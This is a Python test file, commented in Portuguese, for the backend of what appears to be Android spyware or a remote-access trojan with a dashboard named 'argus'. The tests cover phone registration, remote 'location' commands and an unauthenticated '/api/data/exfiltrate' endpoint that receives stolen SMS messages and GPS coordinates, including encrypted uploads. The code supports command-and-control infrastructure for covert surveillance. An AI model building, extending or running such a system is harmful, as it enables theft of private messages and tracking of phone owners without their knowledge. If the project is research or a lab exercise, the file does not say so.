"""
Testes de integração para API de dispositivos
"""

import pytest
import json
from crypto.encryption import EncryptionUtils

class TestDeviceRegistrationAPI:
    """Testes de registro de dispositivos"""
    
    def test_register_device_success(self, client, db_session):
        """Deve registrar dispositivo com dados válidos"""
        device_data = {
            'device_id': 'new_device_001',
            'device_name': 'Test Device',
            'model': 'Test Model',
            'manufacturer': 'Test Manufacturer',
            'android_version': '13',
            'api_level': 33,
            'app_version': '1.0.0'
        }
        
        response = client.post(
            '/api/device/register',
            data=json.dumps(device_data),
            content_type='application/json'
        )
        
        assert response.status_code in [200, 201]
        data = json.loads(response.data)
        assert data.get('success') is True
    
    def test_register_device_encrypted(self, client, db_session):
        """Deve aceitar dados criptografados"""
        device_data = {
            'device_id': 'encrypted_device_001',
            'model': 'Test Model',
            'android_version': '13'
        }
        
        # Criptografar dados
        json_data = json.dumps(device_data)
        encrypted = EncryptionUtils.encrypt(json_data)
        
        response = client.post(
            '/api/device/register',
            data=encrypted,
            content_type='application/octet-stream',
            headers={'X-Device-ID': 'encrypted_device_001'}
        )
        
        # Deve aceitar (ou retornar erro de autenticação)
        assert response.status_code in [200, 201, 400, 401]
    
    def test_register_device_missing_fields(self, client):
        """Deve rejeitar dados incompletos"""
        device_data = {
            'device_id': 'incomplete_device'
            # Faltando campos obrigatórios
        }
        
        response = client.post(
            '/api/device/register',
            data=json.dumps(device_data),
            content_type='application/json'
        )
        
        # Deve aceitar mesmo com campos faltando (serão null)
        assert response.status_code in [200, 201, 400]


class TestDeviceAPI:
    """Testes de endpoints de dispositivos"""
    
    def test_get_devices_requires_auth(self, client):
        """Deve exigir autenticação para listar dispositivos"""
        response = client.get('/api/devices')
        
        # Deve retornar 302 (redirect para login) ou 401
        assert response.status_code in [302, 401]
    
    def test_get_devices_with_auth(self, client, auth_headers, sample_device):
        """Deve listar dispositivos com autenticação"""
        response = client.get('/api/devices', headers=auth_headers)
        
        if response.status_code == 200:
            data = json.loads(response.data)
            assert isinstance(data, list)
    
    def test_get_device_by_id(self, client, auth_headers, sample_device):
        """Deve retornar dispositivo específico"""
        response = client.get(
            f'/api/device/{sample_device.device_id}',
            headers=auth_headers
        )
        
        if response.status_code == 200:
            data = json.loads(response.data)
            assert data['device_id'] == sample_device.device_id
    
    def test_get_nonexistent_device(self, client, auth_headers):
        """Deve retornar 404 para dispositivo inexistente"""
        response = client.get(
            '/api/device/nonexistent_device_999',
            headers=auth_headers
        )
        
        assert response.status_code == 404
    
    def test_delete_device(self, client, auth_headers, db_session):
        """Deve deletar dispositivo existente"""
        from database.backend.models import Device
        
        # Criar device para deletar
        device = Device(device_id='device_to_delete')
        db_session.add(device)
        db_session.commit()
        
        response = client.delete(
            f'/api/device/{device.device_id}',
            headers=auth_headers
        )
        
        if response.status_code == 200:
            # Verificar se foi deletado
            deleted = Device.query.filter_by(device_id='device_to_delete').first()
            assert deleted is None


class TestCommandAPI:
    """Testes de API de comandos"""
    
    def test_send_command_requires_auth(self, client):
        """Deve exigir autenticação para enviar comando"""
        command_data = {
            'device_id': 'test_device',
            'command_type': 'location'
        }
        
        response = client.post(
            '/api/command',
            data=json.dumps(command_data),
            content_type='application/json'
        )
        
        assert response.status_code in [302, 401]
    
    def test_send_command_with_auth(self, client, auth_headers, sample_device):
        """Deve enviar comando com autenticação"""
        command_data = {
            'device_id': sample_device.device_id,
            'command_type': 'location',
            'data': {'accuracy': 'high'}
        }
        
        response = client.post(
            '/api/command',
            data=json.dumps(command_data),
            content_type='application/json',
            headers=auth_headers
        )
        
        if response.status_code in [200, 201]:
            data = json.loads(response.data)
            assert 'command_id' in data
    
    def test_send_command_missing_device_id(self, client, auth_headers):
        """Deve rejeitar comando sem device_id"""
        command_data = {
            'command_type': 'location'
            # Faltando device_id
        }
        
        response = client.post(
            '/api/command',
            data=json.dumps(command_data),
            content_type='application/json',
            headers=auth_headers
        )
        
        assert response.status_code == 400
    
    def test_send_command_missing_command_type(self, client, auth_headers, sample_device):
        """Deve rejeitar comando sem command_type"""
        command_data = {
            'device_id': sample_device.device_id
            # Faltando command_type
        }
        
        response = client.post(
            '/api/command',
            data=json.dumps(command_data),
            content_type='application/json',
            headers=auth_headers
        )
        
        assert response.status_code == 400


class TestDataExfiltrationAPI:
    """Testes de API de exfiltração de dados"""
    
    def test_exfiltrate_data_no_auth(self, client):
        """Endpoint de exfiltração não tem autenticação (by design)"""
        data_payload = {
            'data_type': 'sms',
            'data': {
                'phone_number': '+5511999999999',
                'message_body': 'Test SMS',
                'timestamp': 1234567890
            }
        }
        
        response = client.post(
            '/api/data/exfiltrate',
            data=json.dumps(data_payload),
            content_type='application/json',
            headers={'X-Device-ID': 'test_device_001'}
        )
        
        # Deve aceitar ou retornar 400 (device não registrado)
        assert response.status_code in [200, 400]
    
    def test_exfiltrate_data_missing_device_id(self, client):
        """Deve rejeitar sem device_id"""
        data_payload = {
            'data_type': 'sms',
            'data': {}
        }
        
        response = client.post(
            '/api/data/exfiltrate',
            data=json.dumps(data_payload),
            content_type='application/json'
        )
        
        assert response.status_code == 400
    
    def test_exfiltrate_data_encrypted(self, client, sample_device):
        """Deve aceitar dados criptografados"""
        data_payload = {
            'data_type': 'location',
            'data': {
                'latitude': -23.550520,
                'longitude': -46.633308
            }
        }
        
        json_data = json.dumps(data_payload)
        encrypted = EncryptionUtils.encrypt(json_data)
        
        response = client.post(
            '/api/data/exfiltrate',
            data=encrypted,
            content_type='application/octet-stream',
            headers={'X-Device-ID': sample_device.device_id}
        )
        
        assert response.status_code in [200, 400]


class TestAuthenticationAPI:
    """Testes de autenticação"""
    
    def test_login_success(self, client, admin_user):
        """Deve fazer login com credenciais válidas"""
        response = client.post(
            '/login',
            data={
                'username': 'test_admin',
                'password': 'test_password_123'
            }
        )
        
        if response.content_type == 'application/json':
            data = json.loads(response.data)
            assert data.get('status') == 'success'
        else:
            # Redirect para dashboard
            assert response.status_code in [200, 302]
    
    def test_login_failure_wrong_password(self, client, admin_user):
        """Deve rejeitar senha incorreta"""
        response = client.post(
            '/login',
            data={
                'username': 'test_admin',
                'password': 'wrong_password'
            }
        )
        
        if response.content_type == 'application/json':
            data = json.loads(response.data)
            assert data.get('status') == 'error'
        else:
            assert response.status_code in [401, 200]  # 200 com mensagem de erro
    
    def test_login_failure_nonexistent_user(self, client):
        """Deve rejeitar usuário inexistente"""
        response = client.post(
            '/login',
            data={
                'username': 'nonexistent_user',
                'password': 'any_password'
            }
        )
        
        if response.content_type == 'application/json':
            data = json.loads(response.data)
            assert data.get('status') == 'error'
    
    def test_logout(self, client, admin_user, auth_headers):
        """Deve fazer logout"""
        response = client.get('/logout', headers=auth_headers)
        
        # Deve redirecionar para login
        assert response.status_code in [200, 302]


class TestDashboardPages:
    """Testes de páginas do dashboard"""
    
    def test_dashboard_requires_auth(self, client):
        """Dashboard deve exigir autenticação"""
        response = client.get('/dashboard')
        
        # Deve redirecionar para login
        assert response.status_code in [302, 401]
    
    def test_dashboard_with_auth(self, client, auth_headers):
        """Deve acessar dashboard com autenticação"""
        response = client.get('/dashboard', headers=auth_headers)
        
        # Deve retornar HTML do dashboard
        if response.status_code == 200:
            assert b'dashboard' in response.data.lower() or b'argus' in response.data.lower()
    
    def test_devices_page(self, client, auth_headers):
        """Deve acessar página de dispositivos"""
        response = client.get('/devices', headers=auth_headers)
        assert response.status_code in [200, 302]
    
    def test_commands_page(self, client, auth_headers):
        """Deve acessar página de comandos"""
        response = client.get('/commands', headers=auth_headers)
        assert response.status_code in [200, 302]
    
    def test_logs_page(self, client, auth_headers):
        """Deve acessar página de logs"""
        response = client.get('/logs', headers=auth_headers)
        assert response.status_code in [200, 302]

